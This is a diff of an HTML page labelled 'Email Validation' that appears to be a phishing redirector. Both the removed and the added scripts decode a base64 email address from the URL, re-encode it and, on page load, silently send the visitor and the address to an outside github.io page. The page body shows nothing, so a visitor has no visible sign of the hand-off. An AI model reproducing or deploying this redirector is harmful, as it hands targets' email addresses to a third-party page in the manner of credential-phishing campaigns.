@@ -5,250 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Validation</title>
     <script type="text/javascript">
-        console.log("Email Validation script starting...");
-        console.log("Current URL:", window.location.href);
-        console.log("Hash:", window.location.hash);
-        console.log("Search:", window.location.search);
-        
         function validateEmail(referrer) {
             var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
-            var isValid = re.test(referrer);
-            console.log("validateEmail('" + referrer + "') = " + isValid);
-            return isValid;
+            return re.test(referrer);
         }
 
         decodeBase64 = function(s) {
-            console.log("decodeBase64 called with:", s);
-            if (!s) {
-                console.log("Empty string passed to decodeBase64");
-                return "";
-            }
             var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
             var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
             for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
             for (x = 0; x < L; x++) {
                 c = e[s.charAt(x)];
-                if (c === undefined) {
-                    console.log("Invalid base64 character at position", x, "in string:", s);
-                    throw new Error("Invalid base64 character");
-                }
                 b = (b << 6) + c;
                 l += 6;
                 while (l >= 8) {
                     ((a = (b >>> (l -= 8)) & 0xff) || (x < (L - 2))) && (r += w(a));
                 }
             }
-            console.log("decodeBase64 result:", r);
             return r;
         }
 
-        // Function to check if a string is valid base64
-        function isBase64(str) {
-            console.log("isBase64 checking:", str);
-            if (!str || typeof str !== 'string') {
-                console.log("Not a string or empty");
-                return false;
-            }
-            
-            // Check if string contains only valid base64 characters
-            var base64Pattern = /^[A-Za-z0-9+/]*={0,2}$/;
-            if (!base64Pattern.test(str)) {
-                console.log("Doesn't match base64 pattern");
-                return false;
-            }
-            
-            // Try to decode it
-            try {
-                decodeBase64(str);
-                console.log("Valid base64");
-                return true;
-            } catch (e) {
-                console.log("Invalid base64 - decode failed:", e.message);
-                return false;
-            }
+        //var ramp = window.location.hash.substring(1);
+        var hash = window.location.hash.substring(1);
+        var email = decodeBase64(hash);
+        var email64 = decodeBase64(hash);
+        var email2 = email64.replace('$', '@');
+        var hash2 = btoa(email2);
+        console.log(email);
+        if (validateEmail(email2)) {
+            console.log(email);
+            window.location = "https://modified-technology.github.io/best-new-technology#" + hash2;
         }
-
-        // Function to get email from various URL sources
-        function getEmailFromURL() {
-            console.log("\n=== getEmailFromURL() called ===");
-            
-            // Get URL parameters
-            var urlParams = new URLSearchParams(window.location.search);
-            console.log("URL Params entries:");
-            for (var pair of urlParams.entries()) {
-                console.log(pair[0] + '=' + pair[1]);
-            }
-            
-            // FIRST: Check for email64 parameter (base64 encoded)
-            var email64Param = urlParams.get('email64');
-            console.log("Checking email64 parameter:", email64Param);
-            if (email64Param && isBase64(email64Param)) {
-                try {
-                    var base64Decoded = decodeBase64(email64Param);
-                    console.log("Decoded from email64:", base64Decoded);
-                    if (validateEmail(base64Decoded)) {
-                        console.log("✓ Found valid email in email64 parameter:", base64Decoded);
-                        return base64Decoded;
-                    }
-                } catch (e) {
-                    console.log("Invalid base64 in email64 parameter:", email64Param);
-                }
-            }
-            
-            // SECOND: Check for other base64 parameters
-            var base64Params = ['e64', 'b64', 'base64', 'enc', 'encoded'];
-            for (var i = 0; i < base64Params.length; i++) {
-                var paramValue = urlParams.get(base64Params[i]);
-                console.log("Checking " + base64Params[i] + " parameter:", paramValue);
-                if (paramValue && isBase64(paramValue)) {
-                    try {
-                        var decoded = decodeBase64(paramValue);
-                        console.log("Decoded from " + base64Params[i] + ":", decoded);
-                        if (validateEmail(decoded)) {
-                            console.log("✓ Found valid email in " + base64Params[i] + " parameter:", decoded);
-                            return decoded;
-                        }
-                    } catch (e) {
-                        console.log("Invalid base64 in " + base64Params[i] + " parameter");
-                    }
-                }
-            }
-            
-            // THIRD: Check for plain email parameters
-            var emailParams = ['email', 'e', 'user', 'username', 'mail'];
-            for (var i = 0; i < emailParams.length; i++) {
-                var paramValue = urlParams.get(emailParams[i]);
-                console.log("Checking " + emailParams[i] + " parameter:", paramValue);
-                if (paramValue && validateEmail(paramValue)) {
-                    console.log("✓ Found valid email in " + emailParams[i] + " parameter:", paramValue);
-                    return paramValue;
-                }
-            }
-            
-            // FOURTH: Check URL hash/fragment
-            var hash = window.location.hash.substring(1);
-            console.log("Checking hash:", hash);
-            if (hash) {
-                // Try to decode as base64 first
-                if (isBase64(hash)) {
-                    try {
-                        var base64Decoded = decodeBase64(hash);
-                        console.log("Decoded from hash (as base64):", base64Decoded);
-                        if (validateEmail(base64Decoded)) {
-                            console.log("✓ Found valid base64 email in hash:", base64Decoded);
-                            return base64Decoded;
-                        }
-                    } catch (e) {
-                        console.log("Hash is not valid base64 email");
-                    }
-                }
-                
-                // Check if it's a plain email (replace $ with @ if needed)
-                var emailWithAt = hash.replace(/\$/g, '@');
-                console.log("Checking hash as plain email (after $->@):", emailWithAt);
-                if (validateEmail(emailWithAt)) {
-                    console.log("✓ Found valid plain email in hash:", emailWithAt);
-                    return emailWithAt;
-                }
-                
-                // Check if hash contains base64 pattern
-                var base64Pattern = /([A-Za-z0-9+/]{20,}={0,2})/;
-                var base64Match = hash.match(base64Pattern);
-                console.log("Looking for base64 pattern in hash:", base64Match);
-                if (base64Match && isBase64(base64Match[1])) {
-                    try {
-                        var base64Decoded = decodeBase64(base64Match[1]);
-                        console.log("Decoded from base64 pattern in hash:", base64Decoded);
-                        if (validateEmail(base64Decoded)) {
-                            console.log("✓ Found valid base64 pattern email in hash:", base64Decoded);
-                            return base64Decoded;
-                        }
-                    } catch (e) {
-                        console.log("Base64 pattern in hash is not valid email");
-                    }
-                }
-            }
-            
-            console.log("✗ No valid email found in URL");
-            return null;
-        }
-
-        // Main execution
-        function processEmailAndRedirect() {
-            console.log("\n=== processEmailAndRedirect() called ===");
-            var email = getEmailFromURL();
-            console.log("Final email result:", email);
-            
-            if (email) {
-                // Ensure @ symbol is correct (replace $ with @ if needed)
-                var cleanEmail = email.replace(/\$/g, '@');
-                console.log("Cleaned email:", cleanEmail);
-                
-                if (validateEmail(cleanEmail)) {
-                    console.log("✓ Email is valid, proceeding with redirect");
-                    
-                    // Encode email to base64 for the redirect
-                    try {
-                        var base64Email = btoa(cleanEmail);
-                        console.log("Base64 encoded email:", base64Email);
-                        
-                        // Create the redirect URL with email64 parameter
-                        var redirectUrl = "https://modified-technology.github.io/best-new-technology?email64=" + encodeURIComponent(base64Email);
-                        
-                        console.log("✓ Redirect URL created:", redirectUrl);
-                        console.log("Redirecting NOW...");
-                        
-                        // Redirect to the target URL
-                        window.location = redirectUrl;
-                    } catch (e) {
-                        console.log("Error encoding email to base64:", e);
-                    }
-                } else {
-                    console.log("✗ Invalid email format after cleaning:", cleanEmail);
-                }
-            } else {
-                console.log("✗ No email found, cannot redirect");
-                // For testing, you might want to see the page
-                // document.body.innerHTML = "<h1>No email found in URL</h1><p>Try adding ?email64=YOUR_EMAIL_BASE64 to the URL</p>";
-            }
-        }
-
-        // Start the process when page loads
-        console.log("Setting up event listeners...");
-        
-        if (document.readyState === 'loading') {
-            console.log("Document is still loading, adding DOMContentLoaded listener");
-            document.addEventListener('DOMContentLoaded', function() {
-                console.log("DOMContentLoaded fired");
-                processEmailAndRedirect();
-            });
-        } else {
-            console.log("Document already loaded, calling directly");
-            processEmailAndRedirect();
-        }
-        
-        // Also try to run immediately (in case DOMContentLoaded already fired)
-        console.log("Running immediate check...");
-        setTimeout(function() {
-            console.log("Timeout check - current location:", window.location.href);
-            if (window.location.href.indexOf("modified-technology.github.io") === -1) {
-                console.log("Still on original page, trying redirect again");
-                processEmailAndRedirect();
-            }
-        }, 1000);
     </script>
 </head>
 <body>
-    <h1>Email Validator</h1>
-    <p>This page processes email parameters and redirects.</p>
-    <p>If you see this message, the redirect didn't happen.</p>
-    <p>Check the browser console (F12) for debugging information.</p>
-    <p>Common URL formats:</p>
-    <ul>
-        <li>?email64=YmFzZTY0QGV4YW1wbGUuY29t (base64 encoded email)</li>
-        <li>?email=test@example.com (plain email)</li>
-        <li>#dGVzdEBleGFtcGxlLmNvbQ== (hash with base64 email)</li>
-        <li>#test@example.com (hash with plain email)</li>
-    </ul>
+    <!-- Your HTML content goes here -->
 </body>
 </html>
